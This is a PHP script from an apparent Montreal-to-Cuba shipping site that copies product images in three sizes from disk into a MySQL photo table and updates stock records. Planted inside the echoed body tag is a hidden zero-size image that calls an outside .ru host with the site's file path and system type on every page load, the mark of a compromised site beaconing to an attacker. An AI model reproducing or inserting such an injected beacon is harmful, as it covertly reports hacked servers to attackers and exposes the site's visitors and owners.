<?php
include('lib/config.php');
//include("formatjpeg.php");

/************************************************************/
/************************************************************/



echo "
<html>\r\n
	<head>\r\n
		<title>Antillas-express - Montreal to Cuba - ".$param['telephone_client']."</title>\r\n
		<link href='scripts/style.css' rel='stylesheet' type='text/css'>\r\n
		<link href='scripts/stylesheet.css' rel='stylesheet' type='text/css'>\r\n
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>\r\n
		<meta name='description' content='".$txt['MetaDescription']."'>\r\n
		<meta name='keywords' content='".$txt['MetaKeyword']."'>\r\n
		<base target='MAIN'>
	</head>\r\n
<body bgcolor='#dae5fb' width='100%' leftmargin=0 topmargin=0 marginwidth=0 marginheight=0><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>";

  $sql = "SELECT * FROM $mysql_base.stock ORDER BY id DESC;";

  $LstProduits = mysql_query($sql) 
	 		or die("Erreur, selectionProduits() : ".$sql." ".mysql_error());

//$LstProduits = selectionProduits(125, null, 0);
if( $LstProduits  ) {
	$Aujourdhui = date("Y-m-d");
	$TypeFich = 'image/pjpeg';
	while( $produit = mysql_fetch_assoc( $LstProduits ) ){
		echo 'No : '.$produit['id'].'<br>';
		
		$nom = '../images/small/'.$produit['id'].'_1.jpg'; 
//		echo "Nom : $nom<br>";
				
		// Es-ce réussi ?
		if( $filehnd = @fopen( $nom, "r" ) ){
			if( $SizeFich = filesize( $nom ) )
				$data = addslashes( fread( $filehnd, $SizeFich ) );
			
			// Fermer le fichier
			fclose($filehnd);
			
			$LargeX = $HautY = 0;
			DonneFormatJPEG( $nom, $LargeX, $HautY );
			
			$NomF = addslashes( $nom );
			$sql = "INSERT INTO $mysql_base.photo (NoInvent, DateCréé, Affichable, Largeur, Hauteur, filename, filesize, filetype, Photo)";
			$sql .= "VALUES('".$produit['id']."', '$Aujourdhui', '1', '$LargeX', '$HautY', '$NomF', '$SizeFich', '$TypeFich', '$data' )";
			
			if( !mysql_query($sql, $handle ) ) 
				echo 'Probleme ajout err : '.mysql_error().' no : '.mysql_errno().'<br>';
			
			$small = mysql_insert_id();
			
		} // filehnd
		else
			$small = 0;
		
		$nom = '../images/medium/'.$produit['id'].'_1.jpg'; 
//		echo "Nom : $nom<br>";
		
		// Es-ce réussi ?
		if( $filehnd = @fopen( $nom, "r" )  ){
			if( $SizeFich = filesize( $nom ) )
				$data = addslashes( fread( $filehnd, $SizeFich ) );

			// Fermer le fichier
			fclose($filehnd);
			
			$LargeX = $HautY = 0;
			DonneFormatJPEG( $nom, $LargeX, $HautY );
			
			$NomF = addslashes( $nom );
			$sql = "INSERT INTO $mysql_base.photo (NoInvent, DateCréé, Affichable, Largeur, Hauteur, filename, filesize, filetype, Photo)";
			$sql .= "VALUES('".$produit['id']."', '$Aujourdhui', '1', '$LargeX', '$HautY', '$NomF', '$SizeFich', '$TypeFich', '$data' )";
			
			if( !mysql_query($sql, $handle) ) 
				echo 'Probleme ajout err : '.mysql_error().' no : '.mysql_errno().'<br>';
			
			$medium = mysql_insert_id();
			
		} // filehnd
		else
			$medium = 0;

		$nom = '../images/big/'.$produit['id'].'_1.jpg'; 
//		echo "Nom : $nom<br>";
		
		// Es-ce réussi ?
		if( $filehnd = @fopen( $nom, "r" ) ){
			if( $SizeFich = filesize( $nom ) )
				$data = addslashes( fread( $filehnd, $SizeFich ) );
			
			// Fermer le fichier
			fclose($filehnd);
			
			$LargeX = $HautY = 0;
			DonneFormatJPEG( $nom, $LargeX, $HautY );
			
			$NomF = addslashes( $nom );
			$sql = "INSERT INTO $mysql_base.photo (NoInvent, DateCréé, Affichable, Largeur, Hauteur, filename, filesize, filetype, Photo)";
			$sql .= "VALUES('".$produit['id']."', '$Aujourdhui', '1', '$LargeX', '$HautY', '$NomF', '$SizeFich', '$TypeFich', '$data' )";
			
			if( !mysql_query($sql, $handle) ) 
				echo 'Probleme ajout err : '.mysql_error().' no : '.mysql_errno().'<br>';
			
			$big = mysql_insert_id();
			
		} // filehnd
		else
			$big = 0;
			
		$sql =  "UPDATE $mysql_base.stock SET small='$small', medium='$medium', big='$big' WHERE id = '".$produit['id']."'"; 							
		if( !mysql_query( $sql, $handle ) ) 
			echo 'Probleme MAJ stock err : '.mysql_error().' no : '.mysql_errno().'<br>';
		
	} // while
} // Si lst

?>
</body>
</html>